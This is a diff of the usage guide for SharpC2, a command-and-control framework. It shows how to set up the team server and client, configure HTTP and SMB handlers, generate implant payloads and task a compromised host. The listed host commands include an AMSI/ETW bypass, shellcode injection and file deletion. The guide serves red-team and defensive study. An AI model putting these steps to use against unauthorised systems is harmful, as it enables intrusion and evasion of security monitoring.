@@ -2,11 +2,11 @@
 
 ## Start the Team Server
 
-Launch the team server and provide a shared password that will be used by users to connect.  Make sure you run as root if you want to bind to low ports (e.g. 80) for the default handler.
+Launch the team server and provide a shared password that will be used by users to connect.  Make sure you run as root/admin if you want to bind handlers to low ports (e.g. port 80 for the default HTTP handler).
 
 
 ```text
-rasta@Rastas-MBP publish % sudo ./TeamServer --password Passw0rd!
+rasta@Rastas-MBP publish % sudo ./TeamServer -p Passw0rd!
 Password:
 info: Microsoft.Hosting.Lifetime[0]
     Now listening on: https://0.0.0.0:8443
@@ -15,248 +15,166 @@ info: Microsoft.Hosting.Lifetime[0]
 info: Microsoft.Hosting.Lifetime[0]
     Hosting environment: Production
 info: Microsoft.Hosting.Lifetime[0]
-    Content root path: /Users/rasta/RiderProjects/SharpC2/TeamServer/bin/Release/net5.0/osx-x64/publish
+    Content root path: /Users/rasta/SharpC2/TeamServer/bin/Release/net6.0/osx-x64/publish
 ```
 
-The team server will listen for user connections on port 8443.
+The team server will listen for user connections on port 8443 by default.  This can be changed in `appsettings.json`.
+If the `ASPNETCORE_ENVIRONMENT` environment variable is set to `Development`, the team server's management interface will be bound to localhost only.  Set this to `Production` to have it listen on all interfaces.
 
 ## Start the Client
 
-Launch the client and enter the connection details of the team server.  You'll be prompted to accept the server's self-signed certificate.
+The client requires several command line options including `-s` (--server), `-p` (--port), `-n` (--nick) and `-P` (--password). You'll be prompted to accept the server's self-signed certificate unless `-i` (--ignore-ssl) is used.
 
 ```text
-(server)> localhost
-(port)> 8443
-(nick)> rasta
-(pass)> 
+./SharpC2 -s localhost -p 8443 -n rasta -P Passw0rd!
+  ___ _                   ___ ___
+ / __| |_  __ _ _ _ _ __ / __|_  )
+ \__ \ ' \/ _` | '_| '_ \ (__ / /
+ |___/_||_\__,_|_| | .__/\___/___|
+                   |_|
+    @_RastaMouse
+    @_xpn_
+
 
 Server Certificate
 ------------------
 
 [Subject]
-CN=localhost
+  CN=localhost
 
 [Issuer]
-CN=localhost
+  CN=localhost
 
 [Serial Number]
-5AEB47285CFAB626
+  67B4A5487F67745B
 
 [Not Before]
-22/05/2021 19:48:19
+  25/02/2021 21:01:43
 
 [Not After]
-22/05/2022 19:48:19
+  25/02/2022 21:01:43
 
 [Thumbprint]
-2A02193D78359FEA0AF73916923C193D97B32809
+  B968C8D9C2B40F4AD7A46C92B0B700DEE46492FE
 
-(accept? [y/N])>
+accept? [y/N] > y
 ```
 
 ## Configure and Start a Handler
 
-In SharpC2, "Handlers" are akin to Listeners in other frameworks.  SharpC2 handlers can do more than just listen for incoming data, which is why we elected to use different terminology.
+In SharpC2, "handlers" are akin to listeners in other frameworks.  SharpC2 handlers can do more than just "listen" for incoming data, which is why I elected to use different terminology.
 
 The `[drones]` screen is the default for the client.  You can type `help` on any screen to see commands contextual to that screen.
 
 ```text
-[drones] # help
+[drones] > help
 
-Name      Description
-----      -----------
-back      Back to previous screen
-exit      Exit this client
-handlers  Go to Handlers
-help      Get help
-interact  Interact with the given Drone
-list      List Drones
-payloads  Go to Payloads
+Name          Description
+----          -----------
+exit          Exit this client
+handlers      Manage Handlers
+help          Print a list of commands and their description
+hide          Hide an inactive Drone.
+hosted-files  Manage hosted files
+interact      Interact with a Drone
+list          List Drones
+payload       Generate a payload
 ```
 
-SharpC2 comes with one handler by default which sends and receives C2 traffic over HTTP.
+SharpC2 ships with two handlers. One to egress over HTTP and another to p2p over SMB.
 
 ```text
-[drones] # handlers
-[handlers] # list
+[drones] > handlers
+[handlers] > list
 
 Name          Running
 ----          -------
 default-http  False
+default-smb   False
 ```
 
-Enter the configuration screen for a handler with `config` and then `show` to display the configuration options and their current values.
+Use the `set` command to set parameters for a handler.
 
 ```text
-[handlers] # config default-http
-[default-http] # show
+[handlers] > set default-http BindPort 8080
+[+] BindPort set to 8080
 
-Name            Value      Optional
-----            -----      --------
-BindPort        80         False
-ConnectAddress  localhost  False
-ConnectPort     80         False
+[handlers] > set default-http ConnectPort 8080
+[+] ConnectPort set to 8080
 ```
 
-Change values with `set`.
+A handler can then be started and stopped using the `start` and `stop` commands respectively.
 
 ```text
-[default-http] # set BindPort 8080
-[default-http] # set ConnectPort 8080
-[default-http] # set ConnectAddress 192.168.1.105
-[default-http] # show
-
-Name            Value          Optional
-----            -----          --------
-BindPort        8080           False
-ConnectAddress  192.168.1.105  False
-ConnectPort     8080           False
-```
-
-A handler can be started and stopped from inside this configuration screen, or in the `[handlers]` screen.
-
-```text
-[default-http] # start
+[handlers] > start default-http
 [+] Handler "default-http" started.
 
-[default-http] # stop
+[handlers] > stop default-http
 [+] Handler "default-http" stopped.
-```
-
-or
-
-```text
-[handlers] # list
-
-Name          Running
-----          -------
-default-http  False
-
-[handlers] # start default-http
-[+] Handler "default-http" started.
-
-[handlers] # list
-
-Name          Running
-----          -------
-default-http  True
 ```
 
 ## Generate a Payload
 
-Payloads can be generated from the `[payloads]` screen.
+Payloads can be generated from the `[drones]` screen, uysing the `payload` command.
 
 ```text
-[drones] # payloads
-[payloads] # show
-
-Handler  Format  DllExport
--------  ------  ---------
-         Exe     Execute
-```
-
-As in previous screens, use the `set` commands to set the desired options.
-
-```text
-[payloads] # set handler default-http
-[payloads] # set format Dll          
-[payloads] # set dllexport DemoPayload
-[payloads] # show
-
-Handler       Format  DllExport
--------       ------  ---------
-default-http  Dll     DemoPayload
-```
-
-Some options are not applicable for all payload types (e.g. DllExport does nothing for the Exe format).  To generate the payload, use `generate </output/path>`.
-
-```text
-[payloads] # generate /tmp/drone.dll
-[+] Saved 89088 bytes.
-```
-
-Copy to the target and execute.
-
-```text
-C:\Users\Rasta\Desktop>rundll32 drone.dll,DemoPayload
+[drones] > payload default-http Exe c:\payloads\http-drone.exe
+[+] 204800 bytes saved.
 ```
 
 ## Interacting with Drones
 
 ```text
-[drones] # [+] Drone 45322180d4 checked in.
-[drones] # list
+[+] Drone fafc9af069 checked in from Daniel@Ghost-Canyon.
 
-Guid        Address      Hostname         Username  Process   PID   Arch  LastSeen
-----        -------      --------         --------  -------   ---   ----  --------
-45322180d4  10.211.55.4  DESKTOP-KT84EGC  Rasta     rundll32  3688  x64   0.2s
+[drones] > list
+
+Guid        Parent  Address        Hostname      Username  Process     Pid    Integrity  Arch  LastSeen
+----        ------  -------        --------      --------  -------     ---    ---------  ----  --------
+fafc9af069  -       192.168.1.229  Ghost-Canyon  Daniel    http-drone  16608  Medium     x64   24/11/2021 18:43:22
 ```
 
 To interact with a Drone, use `interact <guid>`.
 
 ```text
-[drones] # interact 45322180d4
-[45322180d4] # help
+[drones] > interact fafc9af069
+[fafc9af069] > help
 
 Name              Description
 ----              -----------
-back              Back to previous screen
+abort             Abort a running task
+back              Go back to the previous screen
 bypass            Set a directive to bypass AMSI/ETW on tasks
+cat               Read a file as text
 cd                Change working directory
 execute-assembly  Execute a .NET assembly
 exit              Exit this Drone
 getuid            Get current identity
-help              Get help
+help              Print a list of commands and their description
+link              Link to an SMB Drone
 load-module       Load an external Drone module
 ls                List filesystem
+mkdir             Create a directory
 overload          Map and execute a native DLL
+ps                List running processes
 pwd               Print working directory
+rm                Delete a file
+rmdir             Delete a directory
 run               Run a command
+services          List services on the current or target machine
 shell             Run a command via cmd.exe
 shinject          Inject arbitrary shellcode into a process
 sleep             Set sleep interval and jitter
+upload            Upload a file to the current working directory of the Drone
 ```
 
-`help [command]` will provide a short description and usage.
-
 ```text
-[45322180d4] # help shell
-Run a command via cmd.exe
-Usage: shell [cmd]
+[fafc9af069] > getuid
+[+] Tasked Drone to run getuid.
+[+] Drone checked in.  Sent 176 bytes.
+[+] Drone task 57582950c7 is running.
 
-[45322180d4] # help run
-Run a command
-Usage: run [cmd] <args>
-```
+GHOST-CANYON\Daniel
 
-Arguments in square brackets are `[mandatory]`, those in angled brackets are `<optional>`.
-
-```text
-[b6631644c4] # run whoami /groups
-[+] Drone tasked: d12abf46ad
-
-[b6631644c4] # [+] Drone checked in. Sent 107 bytes.
-[+] Output received:
-
-GROUP INFORMATION
------------------
-
-Group Name                                                    Type             SID          Attributes                                        
-============================================================= ================ ============ ==================================================
-Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only                          
-BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only                          
-BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
-CONSOLE LOGON                                                 Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
-LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192                                                    
-
-
-
-[+] Task complete.
+[+] Drone task 57582950c7 has completed.
 ```
